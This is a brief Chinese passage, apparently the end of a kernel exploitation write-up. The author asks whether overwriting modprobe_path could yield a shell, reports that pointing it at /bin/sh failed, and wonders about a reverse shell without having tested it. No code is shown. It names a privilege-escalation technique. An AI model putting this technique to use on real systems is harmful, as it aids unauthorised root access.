<p>我不知道利用这种方法可不可以返回一个<code>shell</code>回来,我试过直接将<code>modprobe_path</code>改为<code>/bin/sh</code>去执行,但是不可以;不知道改为反弹shell会不会成功,因为我的环境运行有点问题,所以就没有测试,希望知道的师傅可以说一下....</p>
</div>
</div>